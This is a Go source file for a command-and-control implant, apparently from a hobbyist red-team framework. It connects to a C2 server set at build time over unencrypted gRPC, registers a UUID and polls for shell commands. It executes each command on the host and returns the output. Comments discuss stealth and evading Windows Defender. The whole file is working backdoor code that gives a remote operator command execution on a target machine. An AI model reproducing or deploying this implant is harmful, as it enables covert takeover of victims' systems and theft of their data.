package main

import (
	"context"
	"fmt"
	"gore/grpcapi"
	"log"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"google.golang.org/grpc"
)

/*
This implant binary will be listening to commands from the server, and polls for instructions. When it gets one, it executes an OS instruction.
The name is a bit differnet; the implant is what would be called the client in a normal C2 infrastructre, and the client.go program in this file tree is actually the admin component for us as the Operators.
Client is our API client, not our callback client. Think of this more like a beacon, or an "implant" that is embedded on the target like a tic in some way.
*/

/*
This is a build-time variable. Consult with the build_implant.sh shell script to see how it is invoked. basically this will be empty when built, unless specified during compilation.
each implant will get a UUID when built, and it will contanct the C2 server to add it to a database when it is run.
*/
/*var uuid string //needs to be global.
var ip string
var port_str string*/
var (
	uuid     string
	ip       string
	port_str string
	//build    string
)

// TODO: I think there error here is client-side, each implant needs to check if the commands UUID matches thier own, and then do something about it.
func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient //created generically from the protoc compiler.
	)
	//debug print statement, making sure the build command works
	fmt.Printf("[:] UUID is: %s\n", uuid)
	fmt.Printf("[:] C2 server: %s:%s\n", ip, port_str)
	//convert port str to portnum
	port_num, err := strconv.Atoi(port_str) //maybe just call this some other way, I'm lazy tho
	if err != nil {
		panic(err)
	}

	//may have to be careful with this, and might get one of those bastard ""deprectiated"" alerts.
	//a not-so ismple fix might be to just bite the bullet and assign a self-signed SSL cert that expires i the year 2090 or something.
	//according to foum posts, "grpc.Dial(":9950", grpc.WithTransportCredentials(insecure.NewCredentials()))" is also a way to do this.
	//https://stackoverflow.com/questions/70482508/grpc-withinsecure-is-deprecated-use-insecure-newcredentials-instead
	opts = append(opts, grpc.WithInsecure()) //we would need to alter this to include the certificate
	//connect to server application
	/*if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 5000), opts...); err != nil {
		log.Fatal(err)
		//do something here to try to reconnect. for now, it just dies when it fails.hero organization
	}*/
	//new version with compile injection
	for i := 0; i < 10; i++ {
		//attempt a connection
		if conn, err = grpc.Dial(fmt.Sprintf("%s:%d", ip, port_num), opts...); err != nil { //add timeout connectoin rules here
			//sleep
			time.Sleep(8 * time.Second)
			//log.Fatal(err)
		} else {
			//debug print
			fmt.Println("[+] Connection Success")
			break
		}
	}

	//clean up only on exit
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn) //use protoc compiled functions

	ctx := context.Background() //essesntially, a complex method for waiting for changes in the HTTP traffic
	//create a new request to register
	var reg_req = new(grpcapi.Registration)          //create a new request
	reg_req.Uuid = uuid                              //set reistration UUID to compile-time variable
	_, err = client.RegisterNewImplant(ctx, reg_req) //set with balnk identifier, IDC what this outputs.
	fmt.Println("[:] sent off UUID")
	//fmt.Printf("%s\n", output.)
	if err != nil {
		fmt.Println("[-] Fatal error in registering implant!")
		log.Fatal(err)
	}

	//infinite loop to listen for commands
	for {
		var req = new(grpcapi.Registration)
		req.Uuid = uuid
		cmd, err := client.SendCommand(ctx, req) //make a call to the server, passing in a request context and an "Empty" struct.
		if err != nil {
			log.Fatal(err)
		}
		//check if there is any commands and if the UUID is your own
		if (cmd.In == "") || (cmd.Uuid != uuid) {
			fmt.Println("[:] UUID comparison: ", cmd.Uuid == uuid)
			fmt.Println("[+] compile-time uuid: ", uuid)
			fmt.Println("[+] grpc uuid: ", cmd.Uuid)
			//nothing to do, no input commands.
			time.Sleep(3 * time.Second) //wait 3 seconds. could be more to increase stealth/decrease resource usage.
			//debug printing
			//fmt.Println("[:] Sleeping...")
			continue //repeat the loop
		}
		//tokenize the input from the server
		tokens := strings.Split(cmd.In, " ") //split by spaces
		var instr *exec.Cmd                  //golang specific method of executing syscalls is with "exec"
		if len(tokens) == 1 {
			instr = exec.Command(tokens[0]) //if only one token, then execute the first.
			//disable the window pop-up(windows only I believe). BEWARE, this increases detections and defender WILL pick up on this.
			/*if build == "win" {
				instr.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

		} else {
			instr = exec.Command(tokens[0], tokens[1:]...) //exec works like execv in C, by executing a command as a vector of inputs
			//disable the window pop-up for windows
			/*if build == "win" {
				instr.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/
		}
		//create comnined output of command to sned to implant
		buffer, err := instr.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		//assign the commad the reconstituted tokenized input
		cmd.Out += string(buffer)
		//send to the client
		fmt.Println("[+] sent off my output!")
		client.SendOutput(ctx, cmd) //when a command is issued, it sends the output back to the sender via contexts.
	}
}
